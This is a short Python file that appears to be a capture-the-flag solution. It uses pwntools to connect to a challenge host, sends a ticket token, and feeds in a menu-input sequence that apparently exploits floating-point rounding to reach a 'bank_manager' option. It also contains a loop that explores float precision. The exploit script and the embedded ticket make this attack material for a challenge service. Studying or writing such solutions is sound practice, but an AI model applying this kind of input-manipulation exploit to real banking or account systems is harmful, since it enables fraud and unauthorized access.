""" from pwn import remote

program = remote("memorybank-tlc4zml47uyjm.shellweplayaga.me", 9005)
program.sendline(b"ticket{TabbyFrankie6235n25:eeRzdN96NJOhHvcV9lS14J2uMQL0fxFyLM0BB-Cs0A46xpBa}")

program.sendline(b'random\n2\n1\n0.0000003\n2\n1\n0.0000003\n2\n1\n0.0000003\n4\nrandom\n2\n1\n0.0000003\n4\nbank_manager\n6')
program.interactive()
 """

import os

flt = 0.0000003533405
while (length := len(str(flt))) < 19:
    target = [flt + i * 10 ** -length for i in range(10)]
    print(target)
    break